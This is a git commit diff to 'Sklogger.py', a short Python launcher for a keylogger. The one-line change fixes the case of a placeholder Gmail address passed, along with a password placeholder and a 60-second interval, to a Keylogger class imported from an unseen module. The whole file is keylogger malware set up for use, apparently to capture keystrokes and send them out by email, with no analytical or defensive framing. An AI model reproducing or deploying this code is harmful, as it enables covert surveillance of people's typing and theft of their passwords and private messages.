e4c0648e7cfdffeced2aa355260985d148639d84
swagkarna <46685308+swagkarna@users.noreply.github.com>
2020-04-20 09:12:31 +0530

    Update Sklogger.py

--- Sklogger.py
+++ Sklogger.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
 import main
 
-keylogger = main.Keylogger(60, "youremail@gmail.coM", "gmailpassword")
+keylogger = main.Keylogger(60, "youremail@gmail.com", "gmailpassword")
 keylogger.start()
